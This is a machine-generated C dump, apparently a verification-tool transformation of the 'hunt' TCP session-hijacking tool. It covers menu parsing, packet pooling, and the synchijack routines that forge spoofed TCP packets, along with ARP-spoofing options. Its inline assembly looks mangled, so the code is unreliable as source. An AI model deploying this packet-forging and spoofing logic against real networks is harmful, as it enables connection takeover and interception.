          if(mask_str == ((char *)NULL))
            continue;

          mask=parse_unr(mask_str, 0, 32);
          if(!(mask >= 0))
            continue;

          mask = (signed int)(mask != 0 ? 0xFFFFFFFFU >> 32 - mask : (unsigned int)0);
        }

        else
          if(ip == 0u)
            mask = 0;

          else
            if((0x80FFFFFFU & ip) == 0u)
              mask = 0xFF;

            else
              if((0x40FFFFFFU & ip) == 0u)
                mask = (signed int)0xFFFFU;

              else
                if((0x20FFFFFFU & ip) == 0u)
                  mask = (signed int)0xFFFFFFU;

                else
                  mask = (signed int)0xFFFFFFFFU;
        ports_str=strtok((char *)(void *)0, "\n");
        if(!(ports_str == ((char *)NULL)))
        {
          signed int return_value_parse_ports_3;
          return_value_parse_ports_3=parse_ports(ports_str, ports);
          if(!(return_value_parse_ports_3 >= 0))
            continue;

        }

        else
          memset((void *)ports, 0, sizeof(unsigned int [17l]) /*68ul*/ );
        *ret_ip = ip;
        *ret_mask = (unsigned int)mask;
        memcpy((void *)ret_ports, (const void *)ports, sizeof(unsigned int [17l]) /*68ul*/ );
        return 0;
      }

    }

  }
}

// menu_choose_host_mask_ports_dfl
// file menu.c line 337
signed int menu_choose_host_mask_ports_dfl(char *label, unsigned int *ret_ip, unsigned int *ret_mask, unsigned int *ret_ports, unsigned int dfl_ip, unsigned int dfl_mask, signed int *dfl_ports)
{
  char dfl[256l];
  char *buf_p = dfl;
  char *return_value_host_lookup_1;
  return_value_host_lookup_1=host_lookup(dfl_ip, hl_mode);
  signed int return_value_count_mask_2;
  return_value_count_mask_2=count_mask(dfl_mask);
  signed int return_value_sprintf_3;
  return_value_sprintf_3=sprintf(buf_p, "%s/%d", return_value_host_lookup_1, return_value_count_mask_2);
  buf_p = buf_p + (signed long int)return_value_sprintf_3;
  if(!(dfl_ports == ((signed int *)NULL)))
  {
    if(!(*dfl_ports == 0))
    {
      signed int return_value_sprintf_4;
      return_value_sprintf_4=sprintf(buf_p, " ");
      buf_p = buf_p + (signed long int)return_value_sprintf_4;
      signed int return_value_sprintf_db_ports_5;
      return_value_sprintf_db_ports_5=sprintf_db_ports((unsigned int *)dfl_ports, buf_p, (signed int)(&dfl[(signed long int)sizeof(char [256l]) /*256ul*/ ] - buf_p), 0);
      buf_p = buf_p + (signed long int)return_value_sprintf_db_ports_5;
    }

  }

  signed int return_value_menu_choose_host_mask_ports_6;
  return_value_menu_choose_host_mask_ports_6=menu_choose_host_mask_ports(label, ret_ip, ret_mask, ret_ports, dfl);
  return return_value_menu_choose_host_mask_ports_6;
}

// menu_choose_hostname
// file menu.c line 259
unsigned int menu_choose_hostname(char *label, char *dfl)
{
  char buf[256l];
  unsigned int ip;
  while((_Bool)1)
  {
    signed int return_value_menu_prompt_1;
    return_value_menu_prompt_1=menu_prompt(label, buf, (signed int)sizeof(char [256l]) /*256ul*/ , dfl);
    if(!(return_value_menu_prompt_1 >= 0))
      return (unsigned int)-1;

    ip=parse_hostname(buf);
    if(!(ip == 4294967295u))
      break;

  }
  return ip;
}

// menu_choose_mac
// file hunt.h line 365
signed int menu_choose_mac(char *label, unsigned char *mac_ret, char *dfl)
{
  char buf[512l];
  _Bool tmp_if_expr_4;
  signed int return_value_strncasecmp_3;
  _Bool tmp_if_expr_6;
  signed int return_value_strncasecmp_5;
  _Bool tmp_if_expr_8;
  signed int return_value_strncasecmp_7;
  while((_Bool)1)
  {
    signed int return_value_menu_prompt_1;
    return_value_menu_prompt_1=menu_prompt(label, buf, (signed int)sizeof(char [512l]) /*512ul*/ , dfl);
    if(!(return_value_menu_prompt_1 >= 0))
      return -1;

    signed int return_value_strncasecmp_2;
    return_value_strncasecmp_2=strncasecmp(buf, "my", (unsigned long int)2);
    if(return_value_strncasecmp_2 == 0)
      tmp_if_expr_4 = (_Bool)1;

    else
    {
      return_value_strncasecmp_3=strncasecmp(buf, "my eth", (unsigned long int)6);
      tmp_if_expr_4 = return_value_strncasecmp_3 == 0 ? (_Bool)1 : (_Bool)0;
    }
    if(tmp_if_expr_4)
      tmp_if_expr_6 = (_Bool)1;

    else
    {
      return_value_strncasecmp_5=strncasecmp(buf, "my eth mac", (unsigned long int)10);
      tmp_if_expr_6 = return_value_strncasecmp_5 == 0 ? (_Bool)1 : (_Bool)0;
    }
    if(tmp_if_expr_6)
      tmp_if_expr_8 = (_Bool)1;

    else
    {
      return_value_strncasecmp_7=strncasecmp(buf, "my mac", (unsigned long int)6);
      tmp_if_expr_8 = return_value_strncasecmp_7 == 0 ? (_Bool)1 : (_Bool)0;
    }
    if(tmp_if_expr_8)
    {
      memcpy((void *)mac_ret, (const void *)my_eth_mac, (unsigned long int)6);
      return 0;
    }

    signed int return_value_parse_mac_9;
    return_value_parse_mac_9=parse_mac(buf, (char *)mac_ret);
    if(return_value_parse_mac_9 == 0)
      return 0;

  }
}

// menu_choose_ports
// file menu.c line 274
signed int menu_choose_ports(char *label, signed int *ret_ports, char *dfl)
{
  char buf[512l];
  while((_Bool)1)
  {
    signed int return_value_menu_prompt_1;
    return_value_menu_prompt_1=menu_prompt(label, buf, (signed int)sizeof(char [512l]) /*512ul*/ , dfl);
    if(!(return_value_menu_prompt_1 >= 0))
      return -1;

    signed int return_value_parse_ports_2;
    return_value_parse_ports_2=parse_ports(buf, (unsigned int *)ret_ports);
    if(return_value_parse_ports_2 == 0)
      return 0;

  }
}

// menu_choose_sdb
// file hunt.h line 366
signed int menu_choose_sdb(char *label, char dfl)
{
  char *str = "[s]rc/[d]st/[b]oth";
  char __label[128l];
  char *lbl;
  char buf[64l];
  char __buf_dfl[2l];
  char *buf_dfl;
  if(!(dfl == 0))
  {
    __buf_dfl[(signed long int)0] = dfl;
    __buf_dfl[(signed long int)1] = (char)0;
    buf_dfl = __buf_dfl;
  }

  else
    buf_dfl = (char *)(void *)0;
  if(!(label == ((char *)NULL)))
  {
    sprintf(__label, "%s %s", label, str);
    lbl = __label;
  }

  else
    lbl = str;
  while((_Bool)1)
  {
    signed int return_value_menu_prompt_1;
    return_value_menu_prompt_1=menu_prompt(lbl, buf, (signed int)sizeof(char [64l]) /*64ul*/ , buf_dfl);
    if(!(return_value_menu_prompt_1 >= 0))
      return -1;

    char *return_value___builtin_strchr_2;
    return_value___builtin_strchr_2=__builtin_strchr("sdb", (signed int)buf[(signed long int)0]);
    if(!(return_value___builtin_strchr_2 == ((char *)NULL)))
      return (signed int)buf[(signed long int)0];

    else
      printf("bad src/dst/both\n");
  }
}

// menu_choose_string
// file menu.c line 472
signed int menu_choose_string(char *label, char *ret_buf, signed int buf_len, char *dfl)
{
  char buf[512l];
  signed int len;
  signed int min_len;
  if(label == ((char *)NULL))
    label = "";

  set_tty_color((enum TTY_COLOR)COLOR_WHITE);
  if(!(dfl == ((char *)NULL)))
  {
    unsigned long int return_value_strlen_1;
    return_value_strlen_1=strlen(label);
    if(!(return_value_strlen_1 == 0ul))
      printf("%s [%s]> ", label, dfl);

    else
      printf("[%s]> ", dfl);
  }

  else
    printf("%s> ", label);
  fgets(buf, (signed int)sizeof(char [512l]) /*512ul*/ , stdin);
  set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
  if((signed int)buf[0l] == 0x0a)
  {
    if(!(dfl == ((char *)NULL)))
    {
      strcpy(buf, dfl);
      goto __CPROVER_DUMP_L7;
    }

    return -1;
  }

  else
  {

  __CPROVER_DUMP_L7:
    ;
    unsigned long int return_value_strlen_2;
    return_value_strlen_2=strlen(buf);
    len = (signed int)return_value_strlen_2;
    if((signed int)buf[(signed long int)(len + -1)] == 10)
      buf[(signed long int)(len - 1)] = (char)0;

    min_len = buf_len < len + 1 ? buf_len : len + 1;
    memcpy((void *)ret_buf, (const void *)buf, (unsigned long int)min_len);
    ret_buf[(signed long int)(min_len - 1)] = (char)0;
    return 0;
  }
}

// menu_choose_unr
// file hunt.h line 357
signed int menu_choose_unr(char *label, signed int min, signed int max, signed int dfl)
{
  char buf[64l];
  char __dfl_buf[64l];
  char *dfl_buf;
  signed int i;
  if(!(max >= min))
    return -1;

  else
    if(!(max >= 0) || !(min >= 0))
      return -1;

    else
    {
      if(!(dfl >= 0))
        dfl_buf = (char *)(void *)0;

      else
      {
        sprintf(__dfl_buf, "%d", dfl);
        dfl_buf = __dfl_buf;
      }
      while((_Bool)1)
      {
        signed int return_value_menu_prompt_1;
        return_value_menu_prompt_1=menu_prompt(label, buf, (signed int)sizeof(char [64l]) /*64ul*/ , dfl_buf);
        if(!(return_value_menu_prompt_1 >= 0))
          return -1;

        i=parse_unr(buf, min, max);
        if(i >= 0)
          break;

      }
      return i;
    }
}

// menu_choose_yn
// file menu.c line 454
signed int menu_choose_yn(char *label, signed int dfl)
{
  signed int retval;
  signed int c;
  c=menu_choose_char(label, "nyx", (char)(dfl != 0 ? 121 : 110));
  switch(c)
  {
    case 110:
    {
      retval = 0;
      break;
    }
    case 121:
    {
      retval = 1;
      break;
    }
    default:
      retval = -1;
  }
  return retval;
}

// menu_prompt
// file menu.c line 21
static signed int menu_prompt(char *label, char *buf, signed int buf_size, char *dfl)
{
  if(label == ((char *)NULL))
    label = "";

  set_tty_color((enum TTY_COLOR)COLOR_WHITE);
  if(!(dfl == ((char *)NULL)))
  {
    unsigned long int return_value_strlen_1;
    return_value_strlen_1=strlen(label);
    if(!(return_value_strlen_1 == 0ul))
      printf("%s [%s]> ", label, dfl);

    else
      printf("[%s]> ", dfl);
  }

  else
    printf("%s> ", label);
  fgets(buf, buf_size, stdin);
  set_tty_color((enum TTY_COLOR)COLOR_LIGHTGRAY);
  if((signed int)*buf == 0x0a)
  {
    if(!(dfl == ((char *)NULL)))
    {
      strcpy(buf, dfl);
      goto __CPROVER_DUMP_L7;
    }

    return -1;
  }

  else
  {

  __CPROVER_DUMP_L7:
    ;
    if((signed int)*buf == 120)
      return -1;

    else
      return 0;
  }
}

// need_read_positive
// file synchijack.c line 298
static void need_read_positive(struct packet *p, struct conn_info *ci)
{
  struct tcp_spec ts;
  memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
  ts.saddr = ci->dst_addr;
  ts.daddr = ci->src_addr;
  ts.sport = ci->dst_port;
  ts.dport = ci->src_port;
  ts.src_mac = (char *)ci->src.dst_mac;
  ts.dst_mac = (char *)ci->src.src_mac;
  ts.seq = ci->src.next_d_seq;
  ts.ack_seq = ci->src.next_seq;
  signed int tmp_if_expr_2;
  unsigned short int tmp_statement_expression_1;
  if(!(ci->dst.window == 0))
    tmp_if_expr_2 = (signed int)ci->dst.window;

  else
  {
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)242;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_1 = __v;
    tmp_if_expr_2 = (signed int)tmp_statement_expression_1;
  }
  ts.window = (unsigned short int)tmp_if_expr_2;
  unsigned short int tmp_statement_expression_3;
  unsigned short int need_read_positive__1__2____v;
  unsigned short int need_read_positive__1__2____x;
  unsigned short int tmp_statement_expression_4;
  unsigned short int need_read_positive__1__2__1____v;
  unsigned short int need_read_positive__1__2__1____x = (unsigned short int)ci->dst.id;
  asm("rorw _8, %w0" : "=r"(need_read_positive__1__2__1____v) : "0"(need_read_positive__1__2__1____x) : "cc");
  tmp_statement_expression_4 = need_read_positive__1__2__1____v;
  need_read_positive__1__2____x = (unsigned short int)((signed int)tmp_statement_expression_4 + 1);
  asm("rorw _8, %w0" : "=r"(need_read_positive__1__2____v) : "0"(need_read_positive__1__2____x) : "cc");
  tmp_statement_expression_3 = need_read_positive__1__2____v;
  ts.id = tmp_statement_expression_3;
  ts.ack = 1;
  ts.psh = 1;
  ts.rst = 0;
  ts.data = p->p_data;
  ts.data_len = p->p_data_len;
  _Bool tmp_if_expr_5;
  if((signed int)*p->p_data == 13)
    tmp_if_expr_5 = (_Bool)1;

  else
    tmp_if_expr_5 = (signed int)p->p_data[(signed long int)0] == 10 ? (_Bool)1 : (_Bool)0;
  if(tmp_if_expr_5)
  {
    ts.data = "\r\n_ ";
    ts.data_len = 4;
  }

  else
  {
    ts.data = p->p_data;
    ts.data_len = p->p_data_len;
  }
  send_tcp_packet(&ts);
  need_read = need_read - p->p_data_len;
  need_write = need_write - p->p_data_len;
}

// need_read_write_init
// file synchijack.c line 190
static void need_read_write_init()
{
  need_read_want_n = -100000;
  need_write_want_n = -100000;
}

// need_read_write_negative
// file synchijack.c line 196
static void need_read_write_negative(struct conn_info *ci)
{
  struct tcp_spec ts;
  char buf[1400l];
  signed int len;
  signed int tmp_if_expr_2;
  unsigned short int tmp_statement_expression_1;
  if(!(need_read >= 1) || !(need_write >= 1))
  {
    if(need_read >= need_read_want_n && need_write >= need_write_want_n)
    {
      if(!(need_read >= need_write))
        len = -need_read;

      else
        len = -need_write;
      if((unsigned long int)len >= 1401ul)
        len = (signed int)sizeof(char [1400l]) /*1400ul*/ ;

      memset((void *)buf, 32, (unsigned long int)len);
      ts.saddr = ci->src_addr;
      ts.daddr = ci->dst_addr;
      ts.sport = ci->src_port;
      ts.dport = ci->dst_port;
      ts.src_mac = (char *)ci->dst.dst_mac;
      ts.dst_mac = (char *)ci->dst.src_mac;
      ts.seq = ci->dst.next_d_seq;
      ts.ack_seq = ci->dst.next_seq;
      if(!(ci->src.window == 0))
        tmp_if_expr_2 = (signed int)ci->src.window;

      else
      {
        unsigned short int __v;
        unsigned short int __x = (unsigned short int)242;
        asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
        tmp_statement_expression_1 = __v;
        tmp_if_expr_2 = (signed int)tmp_statement_expression_1;
      }
      ts.window = (unsigned short int)tmp_if_expr_2;
      ts.ack = 1;
      ts.psh = 1;
      ts.rst = 0;
      ts.data = buf;
      ts.data_len = len;
      send_tcp_packet(&ts);
      need_read = need_read + len;
      need_write = need_write + len;
      need_read_want_n = need_read;
      need_write_want_n = need_write;
    }

  }

}

// need_space
// file c/array.c line 120
static void need_space(struct array *a)
{
  signed int new_size;
  struct array_item *new_arr;
  if(a->a_items == a->a_size)
  {
    new_size = a->a_size + (50 * a->a_size) / 100;
    void *return_value_realloc_1;
    return_value_realloc_1=realloc((void *)a->a_arr, (unsigned long int)new_size * sizeof(struct array_item) /*8ul*/ );
    new_arr = (struct array_item *)return_value_realloc_1;
    /* assertion new_arr */
    assert(new_arr != ((struct array_item *)NULL));
    memset((void *)(a->a_arr + (signed long int)a->a_size), 0, (unsigned long int)(new_size - a->a_size) * sizeof(struct array_item) /*8ul*/ );
    a->a_arr = new_arr;
    a->a_size = new_size;
  }

}

// need_write_positive
// file synchijack.c line 237
static void need_write_positive(struct conn_info *ci, char *data, signed int data_len)
{
  struct tcp_spec ts;
  char buf[512l];
  char fin_msg[512l];
  signed int fin_msg_len;
  signed int len;
  char *return_value_suggest_sync_msg_1;
  return_value_suggest_sync_msg_1=suggest_sync_msg(0);
  sprintf(fin_msg, return_value_suggest_sync_msg_1);
  unsigned long int return_value_strlen_2;
  return_value_strlen_2=strlen(fin_msg);
  fin_msg_len = (signed int)return_value_strlen_2;
  if(data == ((char *)NULL))
  {
    len = need_write;
    if((unsigned long int)len >= 513ul)
    {
      len = (signed int)sizeof(char [512l]) /*512ul*/ ;
      memset((void *)buf, 32, (unsigned long int)len);
    }

    else
      if(!(fin_msg_len >= len))
      {
        memset((void *)buf, 32, (unsigned long int)(len - fin_msg_len));
        memcpy((void *)((buf + (signed long int)len) - (signed long int)fin_msg_len), (const void *)fin_msg, (unsigned long int)fin_msg_len);
      }

      else
        memcpy((void *)buf, (const void *)(fin_msg + (signed long int)(fin_msg_len - len)), (unsigned long int)len);
    data = buf;
    data_len = len;
  }

  memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
  ts.saddr = ci->dst_addr;
  ts.daddr = ci->src_addr;
  ts.sport = ci->dst_port;
  ts.dport = ci->src_port;
  ts.src_mac = (char *)ci->src.dst_mac;
  ts.dst_mac = (char *)ci->src.src_mac;
  ts.seq = ci->src.next_d_seq;
  ts.ack_seq = ci->src.next_seq;
  signed int tmp_if_expr_4;
  unsigned short int tmp_statement_expression_3;
  if(!(ci->dst.window == 0))
    tmp_if_expr_4 = (signed int)ci->dst.window;

  else
  {
    unsigned short int __v;
    unsigned short int __x = (unsigned short int)242;
    asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
    tmp_statement_expression_3 = __v;
    tmp_if_expr_4 = (signed int)tmp_statement_expression_3;
  }
  ts.window = (unsigned short int)tmp_if_expr_4;
  unsigned short int tmp_statement_expression_5;
  unsigned short int need_write_positive__1__3____v;
  unsigned short int need_write_positive__1__3____x;
  unsigned short int tmp_statement_expression_6;
  unsigned short int need_write_positive__1__3__1____v;
  unsigned short int need_write_positive__1__3__1____x = (unsigned short int)ci->dst.id;
  asm("rorw _8, %w0" : "=r"(need_write_positive__1__3__1____v) : "0"(need_write_positive__1__3__1____x) : "cc");
  tmp_statement_expression_6 = need_write_positive__1__3__1____v;
  need_write_positive__1__3____x = (unsigned short int)((signed int)tmp_statement_expression_6 + 1);
  asm("rorw _8, %w0" : "=r"(need_write_positive__1__3____v) : "0"(need_write_positive__1__3____x) : "cc");
  tmp_statement_expression_5 = need_write_positive__1__3____v;
  ts.id = tmp_statement_expression_5;
  ts.ack = 1;
  ts.psh = 1;
  ts.rst = 0;
  ts.data = data;
  ts.data_len = data_len;
  send_tcp_packet(&ts);
  need_write = need_write - data_len;
}

// newline_option
// file sniff.c line 816
void newline_option(void)
{
  signed int return_value_menu_choose_char_1;
  return_value_menu_choose_char_1=menu_choose_char("Print newline,... as newline,...", "yn", (char)(o_newline != 0 ? 121 : 110));
  switch(return_value_menu_choose_char_1)
  {
    case 121:
    {
      o_newline = 1;
      break;
    }
    case 110:
      o_newline = 0;
  }
}

// options_menu
// file hunt.h line 608
void options_menu(void)
{
  char buf_menu[2048l];
  char buf_mac[128l];
  char *o_keys = "lamdcghrsqtwyepvix";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    sprintf_eth_mac(buf_mac, __suggest_mac);
    sprintf(buf_menu, "l) list add conn policy                \na/m/d) add/mod/del conn policy entry   \nc) conn list properties    mac %c, seq %c\ng) suggest mac base        %s\nh) host resolving              %c       t) arp req spoof through req   %c\nr) reset ACK storm timeout   %3ds      w) switched environment        %c\ns) simple hijack cmd timeout %3ds      y) arp spoof with my mac       %c\nq) arp req/rep packets       %3d       e) learn MAC from IP traffic   %c\np) number of lines per page  %3d       v) verbose                     %c\ni) print cntrl chars           %c\nx) return\n", conn_list_mac != 0 ? 121 : 110, conn_list_seq != 0 ? 121 : 110, (const void *)buf_mac, hl_mode == 0 ? 110 : 121, arp_request_spoof_through_request != 0 ? 121 : 110, storm_reset_sec, arp_spoof_switch != 0 ? 121 : 110, stormack_hijack_wait_sec, arp_spoof_with_my_mac != 0 ? 121 : 110, arp_rr_count, mac_learn_from_ip != 0 ? 121 : 110, lines_o == 1000000 ? 0 : lines_o, verbose != 0 ? 121 : 110, print_cntrl_chars != 0 ? 121 : 110);
    signed int return_value_menu_1;
    return_value_menu_1=menu("options", buf_menu, "opt", o_keys, (char)0);
    switch(return_value_menu_1)
    {
      case 108:
      {
        addpolicy_list_items();
        break;
      }
      case 97:
      {
        addpolicy_add_item();
        break;
      }
      case 100:
      {
        addpolicy_del_item();
        break;
      }
      case 109:
      {
        addpolicy_mod_item();
        break;
      }
      case 99:
      {
        list_conn_properties();
        break;
      }
      case 103:
      {
        suggest_mac_setup();
        break;
      }
      case 104:
      {
        print_host_properties();
        break;
      }
      case 114:
      {
        storm_reset_sec_setup();
        break;
      }
      case 115:
      {
        stormack_hijack_wait_sec_setup();
        break;
      }
      case 101:
      {
        mac_learn_from_ip_opt();
        break;
      }
      case 116:
      {
        arp_request_spoof_through_request_setup();
        break;
      }
      case 119:
      {
        arp_spoof_switch_setup();
        break;
      }
      case 121:
      {
        arp_spoof_with_my_mac_setup();
        break;
      }
      case 113:
      {
        arp_rr_count_setup();
        break;
      }
      case 112:
      {
        printed_lines_per_page();
        break;
      }
      case 118:
      {
        verbose_setup();
        break;
      }
      case 105:
      {
        print_cntrl_chars_setup();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// packet_copy_data
// file hunt.c line 89
void packet_copy_data(struct packet *dst, struct packet *src)
{
  memcpy((void *)dst->p_raw, (const void *)src->p_raw, (unsigned long int)src->p_raw_len);
  dst->p_raw_len = src->p_raw_len;
  dst->p_type = src->p_type;
  dst->p_ethh = (struct ethhdr *)(dst->p_raw + ((char *)src->p_ethh - src->p_raw));
  dst->p_iph = (struct iphdr *)(dst->p_raw + ((char *)src->p_iph - src->p_raw));
  dst->p_arph = (struct arphdr *)(dst->p_raw + ((char *)src->p_arph - src->p_raw));
  dst->p_hdr.p_tcph = (struct tcphdr *)(dst->p_raw + ((char *)src->p_hdr.p_tcph - src->p_raw));
  dst->p_data_len = src->p_data_len;
  dst->p_data = dst->p_raw + (src->p_data - src->p_raw);
  memcpy((void *)dst->p_arg, (const void *)src->p_arg, sizeof(void *[8l]) /*64ul*/ );
  dst->p_ipc = src->p_ipc;
  dst->p_ipc_arg = src->p_ipc_arg;
}

// packet_count
// file hunt.c line 149
signed int packet_count(void)
{
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_packets);
  return return_value_list_count_1;
}

// packet_flush
// file hunt.c line 130
void packet_flush(struct list *l)
{
  struct packet *p;
  void *return_value_list_pop_1;
  do
  {
    return_value_list_pop_1=list_pop(l);
    p = (struct packet *)return_value_list_pop_1;
    if(p == ((struct packet *)NULL))
      break;

    packet_free(p);
  }
  while((_Bool)1);
}

// packet_free
// file hunt.c line 109
void packet_free(struct packet *p)
{
  signed int is_free;
  pthread_mutex_lock(&p->p_mutex);
  p->p_use_count = p->p_use_count - 1;
  if(p->p_use_count == 0)
    is_free = 1;

  else
    is_free = 0;
  pthread_mutex_unlock(&p->p_mutex);
  if(!(is_free == 0))
    list_push(&l_packets, (void *)p);

}

// packet_match
// file hunt.c line 270
static signed int packet_match(struct packet_info *pi, struct packet *p)
{
  struct iphdr *iph = p->p_iph;
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  _Bool tmp_if_expr_1;
  if(pi->src_addr == (unsigned long int)iph->saddr)
    tmp_if_expr_1 = pi->dst_addr == (unsigned long int)iph->daddr ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_1 = (_Bool)0;
  _Bool tmp_if_expr_2;
  if(tmp_if_expr_1)
    tmp_if_expr_2 = pi->src_port == tcph->_anon0._anon1.source ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_2 = (_Bool)0;
  _Bool tmp_if_expr_3;
  if(tmp_if_expr_2)
    tmp_if_expr_3 = pi->dst_port == tcph->_anon0._anon1.dest ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_3 = (_Bool)0;
  _Bool tmp_if_expr_4;
  if(tmp_if_expr_3)
    tmp_if_expr_4 = pi->src.next_seq == (unsigned long int)tcph->_anon0._anon1.seq ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_4 = (_Bool)0;
  _Bool tmp_if_expr_5;
  if(tmp_if_expr_4)
    tmp_if_expr_5 = pi->src.next_d_seq == (unsigned long int)tcph->_anon0._anon1.ack_seq ? (_Bool)1 : (_Bool)0;

  else
    tmp_if_expr_5 = (_Bool)0;
  _Bool tmp_if_expr_7;
  signed int return_value_memcmp_6;
  if(tmp_if_expr_5)
  {
    return_value_memcmp_6=memcmp((const void *)pi->src.src_mac, (const void *)p->p_ethh->h_source, (unsigned long int)6);
    tmp_if_expr_7 = return_value_memcmp_6 == 0 ? (_Bool)1 : (_Bool)0;
  }

  else
    tmp_if_expr_7 = (_Bool)0;
  _Bool tmp_if_expr_9;
  signed int return_value_memcmp_8;
  if(tmp_if_expr_7)
  {
    return_value_memcmp_8=memcmp((const void *)pi->src.dst_mac, (const void *)p->p_ethh->h_dest, (unsigned long int)6);
    tmp_if_expr_9 = return_value_memcmp_8 == 0 ? (_Bool)1 : (_Bool)0;
  }

  else
    tmp_if_expr_9 = (_Bool)0;
  if(tmp_if_expr_9)
    return 1;

  else
    return 0;
}

// packet_match_db
// file rstd.c line 59
static struct rst_db_item * packet_match_db(struct packet *p)
{
  struct list_iterator li;
  struct rst_db_item *dbi;
  list_lock(&l_rst_db);
  list_iter_set(&li, &l_rst_db);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    dbi = (struct rst_db_item *)return_value_list_iter_get_1;
    if(dbi == ((struct rst_db_item *)NULL))
      break;

    signed int return_value_packet_match_db_item_2;
    return_value_packet_match_db_item_2=packet_match_db_item(p, dbi);
    if(!(return_value_packet_match_db_item_2 == 0))
      break;

  }
  while((_Bool)1);
  list_iter_end(&li);
  list_unlock(&l_rst_db);
  return dbi;
}

// packet_match_db_item
// file rstd.c line 39
static inline signed int packet_match_db_item(struct packet *p, struct rst_db_item *dbi)
{
  struct iphdr *iph = p->p_iph;
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  signed int return_value_port_match_2;
  signed int return_value_port_match_1;
  if((iph->saddr & dbi->src_mask) == (dbi->src_addr & dbi->src_mask))
  {
    if(!((iph->daddr & dbi->dst_mask) == (dbi->dst_addr & dbi->dst_mask)))
      goto __CPROVER_DUMP_L2;

    return_value_port_match_2=port_match((signed int)tcph->_anon0._anon1.source, dbi->src_ports);
    if(return_value_port_match_2 == 0)
      goto __CPROVER_DUMP_L2;

    return_value_port_match_1=port_match((signed int)tcph->_anon0._anon1.dest, dbi->dst_ports);
    if(return_value_port_match_1 == 0)
      goto __CPROVER_DUMP_L2;

    if(dbi->rst_only_syn == 0)
      return 1;

    if(tcph->_anon0._anon1.syn == 0)
      goto __CPROVER_DUMP_L2;

    return 1;
  }

  else
  {

  __CPROVER_DUMP_L2:
    ;
    return 0;
  }
}

// packet_match_relay
// file pktrelay.c line 119
static struct relay_item * packet_match_relay(struct packet *p)
{
  struct list_iterator li;
  struct relay_item *ri;
  list_lock(&l_relay_db);
  list_iter_set(&li, &l_relay_db);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    ri = (struct relay_item *)return_value_list_iter_get_1;
    if(ri == ((struct relay_item *)NULL))
      break;

    signed int return_value_packet_match_relay_item_2;
    return_value_packet_match_relay_item_2=packet_match_relay_item(p, ri);
    if(!(return_value_packet_match_relay_item_2 == 0))
    {
      ri_want(ri);
      break;
    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  list_unlock(&l_relay_db);
  return ri;
}

// packet_match_relay_item
// file pktrelay.c line 105
static inline signed int packet_match_relay_item(struct packet *p, struct relay_item *ri)
{
  struct iphdr *iph = p->p_iph;
  struct tcphdr *tcph = p->p_hdr.p_tcph;
  signed int return_value_port_match_2;
  signed int return_value_port_match_1;
  if((iph->saddr & ri->src_mask) == (ri->src_addr & ri->src_mask))
  {
    if(!((iph->daddr & ri->dst_mask) == (ri->dst_addr & ri->dst_mask)))
      goto __CPROVER_DUMP_L1;

    return_value_port_match_2=port_match((signed int)tcph->_anon0._anon1.source, ri->src_ports);
    if(return_value_port_match_2 == 0)
      goto __CPROVER_DUMP_L1;

    return_value_port_match_1=port_match((signed int)tcph->_anon0._anon1.dest, ri->dst_ports);
    if(return_value_port_match_1 == 0)
      goto __CPROVER_DUMP_L1;

    return 1;
  }

  else
  {

  __CPROVER_DUMP_L1:
    ;
    return 0;
  }
}

// packet_new
// file hunt.c line 66
struct packet * packet_new(void)
{
  struct packet *p;
  void *return_value_list_pop_2;
  return_value_list_pop_2=list_pop(&l_packets);
  p = (struct packet *)return_value_list_pop_2;
  if(p == ((struct packet *)NULL))
  {
    void *return_value_malloc_1;
    return_value_malloc_1=malloc(sizeof(struct packet) /*1776ul*/ );
    p = (struct packet *)return_value_malloc_1;
    if(p == ((struct packet *)NULL))
    {
      perror("malloc");
      return (struct packet *)(void *)0;
    }

    pthread_mutex_init(&p->p_mutex, (const union anonymous_9 *)(void *)0);
    p->p_use_count = 0;
    p->p_hdr.p_tcph = (struct tcphdr *)(void *)0;
    p->p_data = (char *)(void *)0;
    p->p_type = (enum PACKET_TYPE)PACKET_NONE;
    p->p_ipc = 0;
    p->p_ipc_arg = (void *)0;
    packets_allocated = packets_allocated + 1;
  }

  p->p_use_count = 1;
  return p;
}

// packet_preallocate
// file hunt.c line 138
void packet_preallocate(signed int count)
{
  struct packet **p;
  void *return_value___builtin_alloca_1;
  return_value___builtin_alloca_1=__builtin_alloca((unsigned long int)count * sizeof(struct packet *) /*8ul*/ );
  p = (struct packet **)return_value___builtin_alloca_1;
  signed int i = 0;
  for( ; !(i >= count); i = i + 1)
    p[(signed long int)i]=packet_new();
  i = 0;
  for( ; !(i >= count); i = i + 1)
    packet_free(p[(signed long int)i]);
}

// packet_want
// file hunt.c line 123
void packet_want(struct packet *p)
{
  pthread_mutex_lock(&p->p_mutex);
  p->p_use_count = p->p_use_count + 1;
  pthread_mutex_unlock(&p->p_mutex);
}

// parse_hostname
// file menu.c line 120
unsigned int parse_hostname(char *buf)
{
  struct sigaction sac;
  struct sigaction old_sac;
  struct anonymous_3 new_mask;
  char *buf_p;
  struct hostent *hent;
  unsigned int ip;
  buf_p = buf;
  const unsigned short int **return_value___ctype_b_loc_1;
  const unsigned short int **return_value___ctype_b_loc_2;
  do
  {
    return_value___ctype_b_loc_1=__ctype_b_loc();
    if((8 & (signed int)(*return_value___ctype_b_loc_1)[(signed long int)(signed int)*buf_p]) == 0)
    {
      return_value___ctype_b_loc_2=__ctype_b_loc();
      if((4 & (signed int)(*return_value___ctype_b_loc_2)[(signed long int)(signed int)*buf_p]) == 0)
        break;

    }

    buf_p = buf_p + 1l;
  }
  while((_Bool)1);
  *buf_p = (char)0;
